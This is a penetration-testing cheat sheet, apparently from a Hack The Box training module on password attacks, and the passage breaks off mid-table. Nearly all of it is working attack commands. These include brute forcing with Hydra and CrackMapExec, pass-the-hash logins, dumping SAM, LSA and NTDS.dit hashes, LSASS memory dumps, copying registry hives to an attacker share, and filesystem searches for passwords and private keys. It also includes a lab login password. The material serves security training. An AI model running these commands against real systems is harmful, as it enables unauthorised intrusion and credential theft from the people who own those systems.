# Cheat Sheet

## **Connecting to Target**

| **Command**                                                   | **Description**                                                                        |
|-----------------------------------------------------------|------------------------------------------------------------------------------------|
| `xfreerdp /v:<ip> /u:htbstudent /p:HTB_@cademy_stdnt!`    | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password`                  | Uses Evil-WinRM to establish a PowerShell session with a target.                   |
| `ssh user@<ip>`                                           | Uses SSH to connect to a target using a specified user.                            |
| `smbclient -U user \\\\<ip>\\SHARENAME`                   | Uses smbclient to connect to an SMB share using a specified user.                  |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a Linux-based attack host. Useful for transferring files from a target to an attack host. |

## **Password Mutations**

| **Command**                                                                             | **Description**                                          |
|-------------------------------------------------------------------------------------|------------------------------------------------------|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`       | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list`         | Uses Hashcat to generate a rule-based word list.     |

## **Password Attacks**

### **Remote Password Attacks**

| **Command**                                                                              | **Description**                                                          |
|--------------------------------------------------------------------------------------|----------------------------------------------------------------------|
| `crackmapexec winrm <ip> -u user.list -p password.list`                              | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares`                             | Uses CrackMapExec to enumerate SMB shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`                               | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`                                | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -L user.list -p password <service>://<ip>`                                    | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
| `hydra -C <user_pass.list> ssh://<IP>`                                               | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam`               | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa`               | Uses CrackMapExec in conjunction with admin credentials to dump LSA secrets over the network. It is possible to get cleartext credentials this way. |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds`                           | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the NTDS file over a network. |
| `evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`                            | Uses Evil-WinRM to establish a PowerShell session with a Windows target using a user and password hash. This is one type of Pass-The-Hash attack. |

### **Windows Local Password Attacks**

| **Command**                                                                          | **Description**                                                                                                   |
|----------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `tasklist /svc`                                                                  | A command-line-based utility in Windows used to list running processes.                                       |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`  | Uses Windows command-line-based utility findstr to search for the string "password" in many different file types. |
| `Get-Process lsass`                                                              | A PowerShell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`       | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
| `pypykatz lsa minidump /path/to/lsassdumpfile`                                   | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
| `reg.exe save hklm\sam C:\sam.save`                                              | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                                           | Uses move in Windows to transfer a file to a specified file share over the network.                           |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database.                                           |
| `vssadmin CREATE SHADOW /For=C:`                                                 | Uses Windows command-line-based tool vssadmin to create a volume shadow copy for C:. This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command-line-based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.        |

### **Linux Local Password Attacks**

| **Command**                                                                                                          | **Description**                                                                                                   |
|------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system.                             |
| `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done` | Script that can be used to find credentials in specified file types.                                          |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done` | Script that can be used to find common database files.                                                       |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                           | Uses Linux-based find command to search for text files.                                                      |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done` | Script that can be used to search for common file types used with scripts.                                    |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done` | Script used to look for common types of documents.                                                           |
| `cat /etc/crontab`                                                                                              | Uses Linux-based cat command to view the contents of crontab in search for credentials.                      |
| `ls -la /etc/cron.*/`                                                                                           | Uses Linux-based ls -la command to list all files that start with cron contained in the etc directory.        |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"`                                                            | Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.      |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`                                                        | Uses Linux-based grep command to search for the keywords PRIVATE KEY within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`                                                          | Uses Linux-based grep command to
